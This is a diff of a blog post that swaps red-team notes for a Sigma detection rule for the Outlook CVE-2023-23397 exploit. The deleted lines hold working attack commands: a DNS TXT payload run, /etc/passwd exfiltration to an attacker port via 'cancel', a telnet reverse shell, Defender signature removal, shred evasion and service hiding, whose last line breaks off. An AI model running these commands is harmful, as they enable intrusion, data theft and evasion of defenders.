@@ -1,98 +1,48 @@
 ---
 layout: post
-title:  "Red Team quick detection notes"
-date:   2020-09-20 16:46:24 +0200
-categories: [redteam, R&D, usecases]
+title:  "Sigma Collection"
+date:   2023-04-20 16:46:24 +0200
+categories: [detection, R&D, sigma]
 ---
 
 # Windows
 
-## Malicious Payload in DNS Txt
-Attacker can put malicious payload in DNS TXT record content of domain. So, watch out for:
-
+## CVE-2023-23397 Exploitation Attempt
 ```bash
-powershell . (nslookup -q=txt some.domain.com)[-1]
-```
-
-
----
-## Curl with cancel
-Except curl, wget and nc commands, attacker can use ‘cancel’ to exfiltrate data 
-
-```bash
-Attacker machine:
-nc -nlvp 18110 
-
-Victim machine:
-cancel -u "$(cat /etc/passwd | base64)" -h <ip>:<port>
-```
-
----
-
----
-
-## RCE without python Bash 
-After successful RCE inside container, but the container doesn't have BASH, Netcat, Python, or any of your normal revshell helpers, attacker can also use telnet
-
-```bash
-mkfifo /tmp/cth; sh -i 2>&1 </tmp/cth | telnet <atkIP> 8443 >/tmp/cth; rm /tmp/cth
-```
-
----
-
----
-## Explorer.exe for code Execution
-Example: using explorer.exe for code execution
-
-```powershell
-
-explorer.exe /root,"C:\Windows\System32\calc.exe"
-```
-<!-- ![](assets/img/red-teams-notes/pm1.png)
-![](assets/img/red-teams-notes/pm2.png)
-![](assets/img/red-teams-notes/pm3.png)
--->
----
-
-## Windows Defender signature removoal  
-A bit messy, but if Windows Defender is causing you a big headache, rather than disabling it (which alerts the user), you should just neuter it by deleting all the signatures:
-
-```powershell
-"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
-```
-
----
-
----
-
-Red Teamers: those pesky security vendors--like VirusTotal, PaloAlto, and Fortinet--will poke at your infrastructure and evaluate your malicious links, potentially flagging them. Use this .htaccess file to block the common ones outright: https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10
-
----
-
----
-## Delete file with shred
-Just deleting files is not enough. To really remove them, use shred.
-
-```bash
-shred -z cthulhu.txt
-```
-
-If shred command is in monitoring for generating alert, the shred command may be caught, you can do this:
-
-```bash
-FN=cthulhu.txt; dd bs=1k count="du -sk \\"${FN}\\" | cut -f1" if=/dev/urandom >"${FN}"; rm -f "${FN}"
-```
-
----
-
----
-## Hiding Windows services
-This is a really nasty tip: Windows' sc.exe allows you to manually assign service permissions with SDDL syntax. This allows you to essentially make your service invisible unless defenders already know the service name.
-
-Services.exe, Get-Service, sc.exe, all of these fail.
-
-Hiding Windows services:
-
-```powershell
-sc sdset evilsvc "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLO
+title: CVE-2023-23397 Exploitation Attempt
+id: 73c59189-6a6d-4b9f-a748-8f6f9bbed75c
+status: experimental
+description: Detects outlook initiating connection to a WebDAV or SMB share, which
+  could be a sign of CVE-2023-23397 exploitation.
+author: Robert Lee @quantum_cookie
+date: 2023/03/16
+references:
+- https://www.trustedsec.com/blog/critical-outlook-vulnerability-in-depth-technical-analysis-and-recommendations-cve-2023-23397/
+tags:
+- attack.credential_access
+- attack.initial_access
+- cve.2023.23397
+logsource:
+  service: security
+  product: windows
+  definition: 'Requirements: SACLs must be enabled for "Query Value" on the registry
+    keys used in this rule'
+detection:
+  selection:
+    EventID:
+    - 4656
+    - 4663
+    ProcessName|endswith: \OUTLOOK.EXE
+    Accesses|contains: Query key value
+    ObjectName|contains|all:
+    - \REGISTRY\MACHINE\SYSTEM
+    - Services\
+    ObjectName|endswith:
+    - WebClient\NetworkProvider
+    - LanmanWorkstation\NetworkProvider
+  condition: selection
+falsepositives:
+- Searchprotocolhost.exe likes to query these registry keys. To avoid false postives,
+  it's better to filter out those events before they reach the SIEM
+level: critical
 ```
